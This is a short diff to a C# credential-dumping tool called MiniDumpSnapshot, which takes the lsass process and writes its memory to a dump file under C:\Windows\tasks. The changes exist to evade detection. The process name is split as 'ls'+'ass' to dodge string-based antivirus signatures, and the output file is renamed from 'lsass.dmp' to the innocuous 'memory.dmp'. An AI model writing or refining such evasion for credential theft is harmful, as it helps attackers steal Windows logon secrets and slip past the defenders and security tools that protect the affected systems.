@@ -155,7 +155,7 @@ namespace MiniDumpSnapshot
         static int Main(string[] args)
         {
             
-            Process[] lsass = Process.GetProcessesByName("lsass");
+            Process[] lsass = Process.GetProcessesByName("ls"+"ass");
             int processid = lsass[0].Id;
             HANDLE h;
             try
@@ -245,7 +245,7 @@ namespace MiniDumpSnapshot
             }
 
             
-            Console.WriteLine($"[+] LSASS Successsfully Dumped at 'C:\\Windows\\tasks\\lsass.dmp'");
+            Console.WriteLine($"[+] LSASS Successsfully Dumped at 'C:\\Windows\\tasks\\memory.dmp'");
             return 0;
         }
     }
